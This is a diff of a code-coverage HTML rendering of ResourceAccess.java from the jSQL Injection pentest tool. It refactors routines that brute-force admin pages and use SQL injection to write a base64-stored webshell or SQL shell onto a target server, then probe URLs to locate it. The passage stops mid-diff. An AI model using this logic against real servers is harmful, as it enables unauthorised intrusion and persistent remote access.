@@ -14,9 +14,7 @@ import com.jsql.model.InjectionModel;
 import com.jsql.model.bean.util.Header;
 import com.jsql.model.bean.util.Interaction;
 import com.jsql.model.bean.util.Request;
-import com.jsql.model.exception.InjectionFailureException;
 import com.jsql.model.exception.JSqlException;
-import com.jsql.model.exception.StoppedByUserSlidingException;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
 import com.jsql.util.ConnectionUtil;
@@ -42,6 +40,7 @@ import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.*;
 import java.util.concurrent.*;
+import java.util.function.BiFunction;
 import java.util.regex.Pattern;
 
 /**
@@ -53,7 +52,7 @@ public class ResourceAccess {
     /**
      * Log4j logger sent to view.
      */
-<span class="fc" id="L56">    private static final Logger LOGGER = LogManager.getRootLogger();</span>
+<span class="fc" id="L55">    private static final Logger LOGGER = LogManager.getRootLogger();</span>
 
     /**
      * File name for web shell.
@@ -73,41 +72,41 @@ public class ResourceAccess {
     /**
      * True if admin page should stop, false otherwise.
      */
-<span class="fc" id="L76">    private boolean isSearchAdminStopped = false;</span>
+<span class="fc" id="L75">    private boolean isSearchAdminStopped = false;</span>
     
     /**
      * True if scan list should stop, false otherwise.
      */
-<span class="fc" id="L81">    private boolean isScanStopped = false;</span>
+<span class="fc" id="L80">    private boolean isScanStopped = false;</span>
 
     /**
      * True if ongoing file reading must stop, false otherwise.
      * If true any new file read is cancelled at start.
      */
-<span class="fc" id="L87">    private boolean isSearchFileStopped = false;</span>
+<span class="fc" id="L86">    private boolean isSearchFileStopped = false;</span>
 
     /**
      * True if current user has right to read file.
      */
-<span class="fc" id="L92">    private boolean readingIsAllowed = false;</span>
+<span class="fc" id="L91">    private boolean readingIsAllowed = false;</span>
 
     /**
      * List of ongoing jobs.
      */
-<span class="fc" id="L97">    private List&lt;CallableFile&gt; callablesReadFile = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L96">    private List&lt;CallableFile&gt; callablesReadFile = new ArrayList&lt;&gt;();</span>
 
     private static final String MSG_EMPTY_PAYLOAD = &quot;payload integrity check: empty payload&quot;;
 
     private final InjectionModel injectionModel;
 
-<span class="fc" id="L103">    public ResourceAccess(InjectionModel injectionModel) {</span>
+<span class="fc" id="L102">    public ResourceAccess(InjectionModel injectionModel) {</span>
         
-<span class="fc" id="L105">        this.injectionModel = injectionModel;</span>
+<span class="fc" id="L104">        this.injectionModel = injectionModel;</span>
         
-<span class="fc" id="L107">        this.filenameWebshell = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.jw.php&quot;;</span>
-<span class="fc" id="L108">        this.filenameSqlshell = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.js.php&quot;;</span>
-<span class="fc" id="L109">        this.filenameUpload = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.ju.php&quot;;</span>
-<span class="fc" id="L110">    }</span>
+<span class="fc" id="L106">        this.filenameWebshell = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.jw.php&quot;;</span>
+<span class="fc" id="L107">        this.filenameSqlshell = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.js.php&quot;;</span>
+<span class="fc" id="L108">        this.filenameUpload = &quot;.&quot; + this.injectionModel.getVersionJsql() + &quot;.ju.php&quot;;</span>
+<span class="fc" id="L109">    }</span>
 
     /**
      * Check if every page in the list responds 200 Success.
@@ -119,304 +118,329 @@ public class ResourceAccess {
      */
     public int createAdminPages(String urlInjection, List&lt;String&gt; pageNames) throws InterruptedException {
 
-<span class="fc" id="L122">        var matcher = Pattern.compile(&quot;^((https?://)?[^/]*)(.*)&quot;).matcher(urlInjection);</span>
-<span class="fc" id="L123">        matcher.find();</span>
-<span class="fc" id="L124">        String urlProtocol = matcher.group(1);</span>
-<span class="fc" id="L125">        String urlWithoutProtocol = matcher.group(3);</span>
+<span class="fc" id="L121">        var matcher = Pattern.compile(&quot;^((https?://)?[^/]*)(.*)&quot;).matcher(urlInjection);</span>
+<span class="fc" id="L122">        matcher.find();</span>
+<span class="fc" id="L123">        String urlProtocol = matcher.group(1);</span>
+<span class="fc" id="L124">        String urlWithoutProtocol = matcher.group(3);</span>
 
-<span class="fc" id="L127">        List&lt;String&gt; folderSplits = new ArrayList&lt;&gt;();</span>
+<span class="fc" id="L126">        List&lt;String&gt; folderSplits = new ArrayList&lt;&gt;();</span>
 
         // Hostname only
-<span class="pc bpc" id="L130" title="3 of 4 branches missed.">        if (urlWithoutProtocol.isEmpty() || !Pattern.matches(&quot;^/.*&quot;, urlWithoutProtocol)) {</span>
-<span class="fc" id="L131">            urlWithoutProtocol = &quot;/dummy&quot;;</span>
+<span class="pc bpc" id="L129" title="3 of 4 branches missed.">        if (urlWithoutProtocol.isEmpty() || !Pattern.matches(&quot;^/.*&quot;, urlWithoutProtocol)) {</span>
+<span class="fc" id="L130">            urlWithoutProtocol = &quot;/dummy&quot;;</span>
         }
 
-<span class="fc" id="L134">        String[] splits = urlWithoutProtocol.split(&quot;/&quot;, -1);</span>
-<span class="fc" id="L135">        String[] folderNames = Arrays.copyOf(splits, splits.length - 1);</span>
-<span class="fc bfc" id="L136" title="All 2 branches covered.">        for (String folderName: folderNames) {</span>
+<span class="fc" id="L133">        String[] splits = urlWithoutProtocol.split(&quot;/&quot;, -1);</span>
+<span class="fc" id="L134">        String[] folderNames = Arrays.copyOf(splits, splits.length - 1);</span>
+<span class="fc bfc" id="L135" title="All 2 branches covered.">        for (String folderName: folderNames) {</span>
 
-<span class="fc" id="L138">            folderSplits.add(folderName +&quot;/&quot;);</span>
+<span class="fc" id="L137">            folderSplits.add(folderName +&quot;/&quot;);</span>
         }
 
-<span class="fc" id="L141">        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable(&quot;CallableGetAdminPage&quot;));</span>
-<span class="fc" id="L142">        CompletionService&lt;CallableHttpHead&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
+<span class="fc" id="L140">        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable(&quot;CallableGetAdminPage&quot;));</span>
+<span class="fc" id="L141">        CompletionService&lt;CallableHttpHead&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
 
-<span class="fc" id="L144">        var urlPart = new StringBuilder();</span>
+<span class="fc" id="L143">        var urlPart = new StringBuilder();</span>
 
-<span class="fc bfc" id="L146" title="All 2 branches covered.">        for (String segment: folderSplits) {</span>
+<span class="fc bfc" id="L145" title="All 2 branches covered.">        for (String segment: folderSplits) {</span>
 
-<span class="fc" id="L148">            urlPart.append(segment);</span>
+<span class="fc" id="L147">            urlPart.append(segment);</span>
 
-<span class="fc bfc" id="L150" title="All 2 branches covered.">            for (String pageName: pageNames) {</span>
+<span class="fc bfc" id="L149" title="All 2 branches covered.">            for (String pageName: pageNames) {</span>
 
-<span class="fc" id="L152">                taskCompletionService.submit(</span>
+<span class="fc" id="L151">                taskCompletionService.submit(</span>
                     new CallableHttpHead(
                         urlProtocol + urlPart + pageName,
                         this.injectionModel,
                         &quot;check:page&quot;
                     )
                 );
-<span class="fc" id="L159">            }</span>
-<span class="fc" id="L160">        }</span>
+<span class="fc" id="L158">            }</span>
+<span class="fc" id="L159">        }</span>
 
-<span class="fc" id="L162">        var nbAdminPagesFound = 0;</span>
-<span class="fc" id="L163">        int submittedTasks = folderSplits.size() * pageNames.size();</span>
+<span class="fc" id="L161">        var nbAdminPagesFound = 0;</span>
+<span class="fc" id="L162">        int submittedTasks = folderSplits.size() * pageNames.size();</span>
         int tasksHandled;
 
         for (
-<span class="fc" id="L167">            tasksHandled = 0</span>
-<span class="pc bpc" id="L168" title="1 of 4 branches missed.">            ; tasksHandled &lt; submittedTasks &amp;&amp; !this.isSearchAdminStopped()</span>
-<span class="fc" id="L169">            ; tasksHandled++</span>
+<span class="fc" id="L166">            tasksHandled = 0</span>
+<span class="pc bpc" id="L167" title="1 of 4 branches missed.">            ; tasksHandled &lt; submittedTasks &amp;&amp; !this.isSearchAdminStopped()</span>
+<span class="fc" id="L168">            ; tasksHandled++</span>
         ) {
-<span class="fc" id="L171">            nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);</span>
+<span class="fc" id="L170">            nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);</span>
         }
 
-<span class="fc" id="L174">        taskExecutor.shutdown();</span>
-<span class="fc" id="L175">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
+<span class="fc" id="L173">        taskExecutor.shutdown();</span>
+<span class="fc" id="L174">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
 
-<span class="fc" id="L177">        this.setSearchAdminStopped(false);</span>
+<span class="fc" id="L176">        this.setSearchAdminStopped(false);</span>
 
-<span class="fc" id="L179">        this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);</span>
+<span class="fc" id="L178">        this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);</span>
 
-<span class="fc" id="L181">        var request = new Request();</span>
-<span class="fc" id="L182">        request.setMessage(Interaction.END_ADMIN_SEARCH);</span>
-<span class="fc" id="L183">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L180">        var request = new Request();</span>
+<span class="fc" id="L181">        request.setMessage(Interaction.END_ADMIN_SEARCH);</span>
+<span class="fc" id="L182">        this.injectionModel.sendToViews(request);</span>
 
-<span class="fc" id="L185">        return nbAdminPagesFound;</span>
+<span class="fc" id="L184">        return nbAdminPagesFound;</span>
     }
 
     public int callAdminPage(CompletionService&lt;CallableHttpHead&gt; taskCompletionService, int nbAdminPagesFound) {
         
-<span class="fc" id="L190">        int nbAdminPagesFoundFixed = nbAdminPagesFound;</span>
+<span class="fc" id="L189">        int nbAdminPagesFoundFixed = nbAdminPagesFound;</span>
         
         try {
-<span class="fc" id="L193">            CallableHttpHead currentCallable = taskCompletionService.take().get();</span>
+<span class="fc" id="L192">            CallableHttpHead currentCallable = taskCompletionService.take().get();</span>
             
-<span class="pc bpc" id="L195" title="1 of 2 branches missed.">            if (currentCallable.isHttpResponseOk()) {</span>
+<span class="pc bpc" id="L194" title="1 of 2 branches missed.">            if (currentCallable.isHttpResponseOk()) {</span>
                 
-<span class="fc" id="L197">                var request = new Request();</span>
-<span class="fc" id="L198">                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);</span>
-<span class="fc" id="L199">                request.setParameters(currentCallable.getUrl());</span>
-<span class="fc" id="L200">                this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L196">                var request = new Request();</span>
+<span class="fc" id="L197">                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);</span>
+<span class="fc" id="L198">                request.setParameters(currentCallable.getUrl());</span>
+<span class="fc" id="L199">                this.injectionModel.sendToViews(request);</span>
 
-<span class="fc" id="L202">                nbAdminPagesFoundFixed++;</span>
-<span class="fc" id="L203">                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Found page: {}&quot;, currentCallable.getUrl());</span>
+<span class="fc" id="L201">                nbAdminPagesFoundFixed++;</span>
+<span class="fc" id="L202">                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Found page: {}&quot;, currentCallable.getUrl());</span>
             }
             
-<span class="nc" id="L206">        } catch (InterruptedException e) {</span>
+<span class="nc" id="L205">        } catch (InterruptedException e) {</span>
             
-<span class="nc" id="L208">            LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
-<span class="nc" id="L209">            Thread.currentThread().interrupt();</span>
+<span class="nc" id="L207">            LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
+<span class="nc" id="L208">            Thread.currentThread().interrupt();</span>
             
-<span class="nc" id="L211">        } catch (ExecutionException e) {</span>
+<span class="nc" id="L210">        } catch (ExecutionException e) {</span>
             
-<span class="nc" id="L213">            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);</span>
-<span class="pc" id="L214">        }</span>
+<span class="nc" id="L212">            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);</span>
+<span class="pc" id="L213">        }</span>
         
-<span class="fc" id="L216">        return nbAdminPagesFoundFixed;</span>
+<span class="fc" id="L215">        return nbAdminPagesFoundFixed;</span>
     }
 
     public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
         
-<span class="fc" id="L221">        var result = String.format(</span>
+<span class="fc" id="L220">        var result = String.format(</span>
             &quot;Found %s admin page%s%s on %s page%s&quot;,
-<span class="fc" id="L223">            nbAdminPagesFound,</span>
-<span class="pc bpc" id="L224" title="1 of 2 branches missed.">            nbAdminPagesFound &gt; 1 ? 's' : StringUtils.EMPTY,</span>
-<span class="pc bpc" id="L225" title="1 of 2 branches missed.">            tasksHandled != submittedTasks ? &quot; of &quot;+ tasksHandled +&quot; processed&quot; : StringUtils.EMPTY,</span>
-<span class="fc" id="L226">            submittedTasks,</span>
-<span class="pc bpc" id="L227" title="1 of 2 branches missed.">            submittedTasks &gt; 1 ? 's' : StringUtils.EMPTY</span>
+<span class="fc" id="L222">            nbAdminPagesFound,</span>
+<span class="pc bpc" id="L223" title="1 of 2 branches missed.">            nbAdminPagesFound &gt; 1 ? 's' : StringUtils.EMPTY,</span>
+<span class="pc bpc" id="L224" title="1 of 2 branches missed.">            tasksHandled != submittedTasks ? &quot; of &quot;+ tasksHandled +&quot; processed&quot; : StringUtils.EMPTY,</span>
+<span class="fc" id="L225">            submittedTasks,</span>
+<span class="pc bpc" id="L226" title="1 of 2 branches missed.">            submittedTasks &gt; 1 ? 's' : StringUtils.EMPTY</span>
         );
         
-<span class="pc bpc" id="L230" title="1 of 2 branches missed.">        if (nbAdminPagesFound &gt; 0) {</span>
+<span class="pc bpc" id="L229" title="1 of 2 branches missed.">        if (nbAdminPagesFound &gt; 0) {</span>
             
-<span class="fc" id="L232">            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);</span>
+<span class="fc" id="L231">            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);</span>
             
         } else {
             
-<span class="nc" id="L236">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);</span>
+<span class="nc" id="L235">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);</span>
         }
-<span class="fc" id="L238">    }</span>
-    
+<span class="fc" id="L237">    }</span>
+
     /**
      * Create a webshell in the server.
      * @param pathShell Remote path of the file
-     * @throws InterruptedException
-     * @throws InjectionFailureException
-     * @throws StoppedByUserSlidingException
      */
     public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
-        
-<span class="pc bpc" id="L249" title="1 of 2 branches missed.">        if (!this.isReadingAllowed()) {</span>
-            
-<span class="nc" id="L251">            return;</span>
+
+<span class="fc" id="L245">        BiFunction&lt;String, String, Request&gt; biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -&gt; {</span>
+<span class="fc" id="L246">            var request = new Request();</span>
+<span class="fc" id="L247">            request.setMessage(Interaction.CREATE_SHELL_TAB);</span>
+<span class="fc" id="L248">            request.setParameters(</span>
+<span class="fc" id="L249">                pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY),</span>
+                urlSuccess
+            );
+<span class="fc" id="L252">            return request;</span>
+        };
+
+<span class="fc" id="L255">        createShell(pathShell, urlShell, &quot;shell.web&quot;, this.filenameWebshell, biFunctionGetRequest);</span>
+<span class="fc" id="L256">    }</span>
+
+    /**
+     * Create SQL shell on the server. Override username and password eventually.
+     * @param pathShell Script to create on the server
+     * @param urlShell URL for the script (used for url rewriting)
+     * @param username User name for current database
+     * @param password User password for current database
+     */
+    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
+
+<span class="fc" id="L267">        BiFunction&lt;String, String, Request&gt; biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -&gt; {</span>
+<span class="fc" id="L268">            var request = new Request();</span>
+<span class="fc" id="L269">            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);</span>
+<span class="fc" id="L270">            request.setParameters(</span>
+<span class="fc" id="L271">                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),</span>
+                urlSuccess,
+                username,
+                password
+            );
+<span class="fc" id="L276">            return request;</span>
+        };
+
+<span class="fc" id="L279">        createShell(pathShell, urlShell, &quot;shell.sql&quot;, this.filenameSqlshell, biFunctionGetRequest);</span>
+<span class="fc" id="L280">    }</span>
+
+    public void createShell(
+        String pathShell,
+        String urlShell,
+        String property,
+        String filename,
+        BiFunction&lt;String, String, Request&gt; biFunctionGetRequest
+    ) throws JSqlException, InterruptedException {
+
+<span class="pc bpc" id="L290" title="1 of 2 branches missed.">        if (!this.isReadingAllowed()) {</span>
+
+<span class="nc" id="L292">            return;</span>
         }
-        
-<span class="fc" id="L254">        String bodyShell = StringUtil.base64Decode(</span>
-<span class="fc" id="L255">            this.injectionModel.getMediatorUtils()</span>
-<span class="fc" id="L256">            .getPropertiesUtil()</span>
-<span class="fc" id="L257">            .getProperties()</span>
-<span class="fc" id="L258">            .getProperty(&quot;shell.web&quot;)</span>
+
+<span class="fc" id="L295">        String bodyShell = StringUtil.base64Decode(</span>
+<span class="fc" id="L296">            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(property)</span>
         )
-<span class="fc" id="L260">        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)</span>
-<span class="fc" id="L261">        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);</span>
+<span class="fc" id="L298">        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)</span>
+<span class="fc" id="L299">        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);</span>
 
-<span class="fc" id="L263">        String pathShellFixed = pathShell;</span>
-<span class="fc bfc" id="L264" title="All 2 branches covered.">        if (!pathShellFixed.matches(&quot;.*/$&quot;)) {</span>
-            
-<span class="fc" id="L266">            pathShellFixed += &quot;/&quot;;</span>
+<span class="fc" id="L301">        String pathShellFixed = pathShell;</span>
+<span class="fc bfc" id="L302" title="All 2 branches covered.">        if (!pathShellFixed.matches(&quot;.*/$&quot;)) {</span>
+
+<span class="fc" id="L304">            pathShellFixed += &quot;/&quot;;</span>
         }
 
-<span class="fc" id="L269">        this.injectionModel.injectWithoutIndex(</span>
+<span class="fc" id="L307">        this.injectionModel.injectWithoutIndex(</span>
             this.injectionModel
-<span class="fc" id="L271">            .getMediatorVendor()</span>
-<span class="fc" id="L272">            .getVendor()</span>
-<span class="fc" id="L273">            .instance()</span>
-<span class="fc" id="L274">            .sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameWebshell),</span>
-            &quot;shell:create-web&quot;
+<span class="fc" id="L309">            .getMediatorVendor()</span>
+<span class="fc" id="L310">            .getVendor()</span>
+<span class="fc" id="L311">            .instance()</span>
+<span class="fc" id="L312">            .sqlTextIntoFile(bodyShell, pathShellFixed + filename),</span>
+            &quot;shell:create&quot;
         );
 
         String resultInjection;
-<span class="fc" id="L279">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
+<span class="fc" id="L317">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
         try {
-<span class="fc" id="L281">            resultInjection = new SuspendableGetRows(this.injectionModel).run(</span>
-<span class="fc" id="L282">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameWebshell),</span>
+<span class="fc" id="L319">            resultInjection = new SuspendableGetRows(this.injectionModel).run(</span>
+<span class="fc" id="L320">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + filename),</span>
                 sourcePage,
-<span class="fc" id="L284">                false,</span>
-<span class="fc" id="L285">                1,</span>
+<span class="fc" id="L322">                false,</span>
+<span class="fc" id="L323">                1,</span>
                 null,
                 &quot;shell:read&quot;
             );
 
-<span class="pc bpc" id="L290" title="1 of 2 branches missed.">            if (StringUtils.isEmpty(resultInjection)) {</span>
+<span class="pc bpc" id="L328" title="1 of 2 branches missed.">            if (StringUtils.isEmpty(resultInjection)) {</span>
 
-<span class="nc" id="L292">                throw new JSqlException(MSG_EMPTY_PAYLOAD);</span>
+<span class="nc" id="L330">                throw new JSqlException(MSG_EMPTY_PAYLOAD);</span>
             }
-            
-<span class="nc" id="L295">        } catch (JSqlException e) {</span>
 
-<span class="nc" id="L297">            throw new JSqlException(&quot;injected payload does not match source&quot;, e);</span>
-<span class="fc" id="L298">        }</span>
-        
-<span class="fc" id="L300">        String urlShellFixed = urlShell;</span>
-        
-<span class="fc bfc" id="L302" title="All 2 branches covered.">        if (!urlShellFixed.isEmpty()) {</span>
-            
-<span class="fc" id="L304">            urlShellFixed = urlShellFixed.replaceAll(&quot;/*$&quot;, StringUtils.EMPTY) +&quot;/&quot;;</span>
-        }
-        
-<span class="fc" id="L307">        String url = urlShellFixed;</span>
-<span class="fc bfc" id="L308" title="All 2 branches covered.">        if (StringUtils.isEmpty(url)) {</span>
-            
-<span class="fc" id="L310">            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();</span>
+<span class="nc" id="L333">        } catch (JSqlException e) {</span>
+
+<span class="nc" id="L335">            throw new JSqlException(&quot;injected payload does not match source&quot;, e);</span>
+<span class="fc" id="L336">        }</span>
+
+<span class="fc" id="L338">        String urlShellFixed = urlShell;</span>
+
+<span class="fc bfc" id="L340" title="All 2 branches covered.">        if (!urlShellFixed.isEmpty()) {</span>
+
+<span class="fc" id="L342">            urlShellFixed = urlShellFixed.replaceAll(&quot;/*$&quot;, StringUtils.EMPTY) +&quot;/&quot;;</span>
         }
 
-<span class="pc bpc" id="L313" title="1 of 2 branches missed.">        if (!resultInjection.contains(bodyShell)) {</span>
-            
-<span class="nc" id="L315">            throw this.getIntegrityError(sourcePage);</span>
-        }
-            
-<span class="fc" id="L318">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Web payload created into '{}{}'&quot;, pathShellFixed, this.filenameWebshell);</span>
+<span class="fc" id="L345">        String url = urlShellFixed;</span>
+<span class="fc bfc" id="L346" title="All 2 branches covered.">        if (StringUtils.isEmpty(url)) {</span>
 
-<span class="fc" id="L320">        String urlWithoutProtocol = url.replaceAll(&quot;^https?://[^/]*&quot;, StringUtils.EMPTY);</span>
-        
+<span class="fc" id="L348">            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();</span>
+        }
+
+<span class="pc bpc" id="L351" title="1 of 2 branches missed.">        if (!resultInjection.contains(bodyShell)) {</span>
+
+<span class="nc" id="L353">            throw this.getIntegrityError(sourcePage);</span>
+        }
+
+<span class="fc" id="L356">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Payload created into '{}{}'&quot;, pathShellFixed, filename);</span>
+
+<span class="fc" id="L358">        String urlWithoutProtocol = url.replaceAll(&quot;^https?://[^/]*&quot;, StringUtils.EMPTY);</span>
+
         String urlProtocol;
-        
-<span class="pc bpc" id="L324" title="1 of 2 branches missed.">        if (&quot;/&quot;.equals(urlWithoutProtocol)) {</span>
-            
-<span class="nc" id="L326">            urlProtocol = url.replaceAll(&quot;/+$&quot;, StringUtils.EMPTY);</span>
-            
+
+<span class="pc bpc" id="L362" title="1 of 2 branches missed.">        if (&quot;/&quot;.equals(urlWithoutProtocol)) {</span>
+
+<span class="nc" id="L364">            urlProtocol = url.replaceAll(&quot;/+$&quot;, StringUtils.EMPTY);</span>
+
         } else {
-            
-<span class="fc" id="L330">            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);</span>
-        }
-        
-<span class="fc" id="L333">        String urlWithoutFileName = urlWithoutProtocol.replaceAll(&quot;[^/]*$&quot;, StringUtils.EMPTY).replaceAll(&quot;/+&quot;, &quot;/&quot;);</span>
-        
-<span class="fc" id="L335">        List&lt;String&gt; directoryNames = new ArrayList&lt;&gt;();</span>
-<span class="fc bfc" id="L336" title="All 2 branches covered.">        if (urlWithoutFileName.split(&quot;/&quot;).length == 0) {</span>
-            
-<span class="fc" id="L338">            directoryNames.add(&quot;/&quot;);</span>
-        }
-        
-<span class="fc bfc" id="L341" title="All 2 branches covered.">        for (String directoryName: urlWithoutFileName.split(&quot;/&quot;)) {</span>
-            
-<span class="fc" id="L343">            directoryNames.add(directoryName +&quot;/&quot;);</span>
-        }
-        
-<span class="fc" id="L346">        this.injectWebshell(pathShellFixed, urlProtocol, directoryNames);</span>
-<span class="fc" id="L347">    }</span>
 
-    private void injectWebshell(String pathShellFixed, String urlProtocol, List&lt;String&gt; directoryNames) throws InterruptedException {
-        
-<span class="fc" id="L351">        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor(&quot;CallableCreateWebShell&quot;);</span>
-        
-<span class="fc" id="L353">        CompletionService&lt;CallableHttpHead&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
-        
-<span class="fc" id="L355">        var urlPart = new StringBuilder();</span>
-        
-<span class="fc bfc" id="L357" title="All 2 branches covered.">        for (String segment: directoryNames) {</span>
-            
-<span class="fc" id="L359">            urlPart.append(segment);</span>
-<span class="fc" id="L360">            taskCompletionService.submit(</span>
-                new CallableHttpHead(
-                    urlProtocol + urlPart + this.filenameWebshell,
-                    this.injectionModel,
-                    &quot;shell#confirm&quot;
-                )
+<span class="fc" id="L368">            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);</span>
+        }
+
+<span class="fc" id="L371">        String urlWithoutFileName = urlWithoutProtocol.replaceAll(&quot;[^/]*$&quot;, StringUtils.EMPTY).replaceAll(&quot;/+&quot;, &quot;/&quot;);</span>
+
+<span class="fc" id="L373">        List&lt;String&gt; directoryNames = new ArrayList&lt;&gt;();</span>
+<span class="pc bpc" id="L374" title="1 of 2 branches missed.">        if (urlWithoutFileName.split(&quot;/&quot;).length == 0) {</span>
+
+<span class="nc" id="L376">            directoryNames.add(&quot;/&quot;);</span>
+        }
+
+<span class="fc bfc" id="L379" title="All 2 branches covered.">        for (String directoryName: urlWithoutFileName.split(&quot;/&quot;)) {</span>
+
+<span class="fc" id="L381">            directoryNames.add(directoryName +&quot;/&quot;);</span>
+        }
+
+<span class="fc" id="L384">        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor(&quot;CallableCreateShell&quot;);</span>
+
+<span class="fc" id="L386">        CompletionService&lt;CallableHttpHead&gt; taskCompletionService = new ExecutorCompletionService&lt;&gt;(taskExecutor);</span>
+
+<span class="fc" id="L388">        var urlPart = new StringBuilder();</span>
+
+<span class="fc bfc" id="L390" title="All 2 branches covered.">        for (String segment: directoryNames) {</span>
+
+<span class="fc" id="L392">            urlPart.append(segment);</span>
+<span class="fc" id="L393">            taskCompletionService.submit(</span>
+                    new CallableHttpHead(
+                            urlProtocol + urlPart + filename,
+                            this.injectionModel,
+                            &quot;shell#confirm&quot;
+                    )
             );
-<span class="fc" id="L367">        }</span>
+<span class="fc" id="L400">        }</span>
 
-<span class="fc" id="L369">        int submittedTasks = directoryNames.size();</span>
-<span class="fc" id="L370">        String urlSuccess = this.injectShell(taskCompletionService, submittedTasks);</span>
+<span class="fc" id="L402">        int submittedTasks = directoryNames.size();</span>
+<span class="fc" id="L403">        String urlSuccess = null;</span>
 
-<span class="fc" id="L372">        taskExecutor.shutdown();</span>
-<span class="fc" id="L373">        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);</span>
-        
-<span class="pc bpc" id="L375" title="1 of 2 branches missed.">        if (urlSuccess != null) {</span>
-            
-<span class="fc" id="L377">            var request = new Request();</span>
-<span class="fc" id="L378">            request.setMessage(Interaction.CREATE_SHELL_TAB);</span>
-<span class="fc" id="L379">            request.setParameters(pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY), urlSuccess);</span>
-<span class="fc" id="L380">            this.injectionModel.sendToViews(request);</span>
-            
-<span class="fc" id="L382">        } else {</span>
-            
-<span class="nc" id="L384">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Payload not found&quot;);</span>
-        }
-<span class="fc" id="L386">    }</span>
+<span class="fc bfc" id="L405" title="All 2 branches covered.">        for (var tasksHandled = 0 ; tasksHandled &lt; submittedTasks ; tasksHandled++) {</span>
 
-    private String injectShell(CompletionService&lt;CallableHttpHead&gt; taskCompletionService, int submittedTasks) {
-        
-<span class="fc" id="L390">        String urlSuccess = null;</span>
-        
-<span class="fc bfc" id="L392" title="All 2 branches covered.">        for (var tasksHandled = 0 ; tasksHandled &lt; submittedTasks ; tasksHandled++) {</span>
-            
             try {
-<span class="fc" id="L395">                CallableHttpHead currentCallable = taskCompletionService.take().get();</span>
-                
-<span class="fc bfc" id="L397" title="All 2 branches covered.">                if (currentCallable.isHttpResponseOk()) {</span>
-                    
-<span class="fc" id="L399">                    urlSuccess = currentCallable.getUrl();</span>
-<span class="fc" id="L400">                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Payload found: {}&quot;, urlSuccess);</span>
+<span class="fc" id="L408">                CallableHttpHead currentCallable = taskCompletionService.take().get();</span>
+
+<span class="fc bfc" id="L410" title="All 2 branches covered.">                if (currentCallable.isHttpResponseOk()) {</span>
+
+<span class="fc" id="L412">                    urlSuccess = currentCallable.getUrl();</span>
+<span class="fc" id="L413">                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Payload found: {}&quot;, urlSuccess);</span>
 
                 } else {
-                    
-<span class="fc" id="L404">                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, &quot;Payload not found: {}&quot;, currentCallable.getUrl());</span>
+
